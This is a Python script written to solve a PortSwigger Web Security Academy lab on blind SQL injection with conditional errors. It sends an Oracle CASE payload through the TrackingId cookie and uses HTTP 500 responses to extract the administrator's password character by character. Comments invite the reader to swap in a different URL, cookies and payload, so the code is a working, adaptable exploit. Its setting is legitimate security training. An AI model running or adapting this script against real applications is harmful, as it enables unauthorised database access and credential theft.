# This python script can be used to extract information from a database with conditional errors
# Portswigger Lab - https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import requests
import string
from requests.structures import CaseInsensitiveDict
import time


# Update the URL value as needed
url = "https://0a8f00d9039963e884266e84009d005c.web-security-academy.net/filter?category=Gifts"
headers = CaseInsensitiveDict()

leaked_data = list("")

while True:
    for character in string.printable:
        print("Extracted Password:  " + "".join(leaked_data))
        print("This the character we are testing next:  " + character)

        position = len(leaked_data) + 1

        # The vulnerable parameter to Blind SQL is a cookie value, this is using the f string to update the position and character automatically
        # Update theTrackingId and Session Cookies or SQL payload/query as needed
        headers[
            "Cookie"
        ] = f"TrackingId=iqZJVYlgMKVn8AvE'+||+(SELECT CASE WHEN (substr((select password from users where username = 'administrator'),{position},1)='{character}') THEN to_char(1/0) ELSE NULL END FROM dual)+||'; session=q7byc76fI70oZVG4yY8F0CZA4y64q8Aw"

        resp = requests.get(url, headers=headers)

        print(resp.status_code)

        # Update response status code as needed
        if resp.status_code == 500:
            leaked_data.append(character)
            break
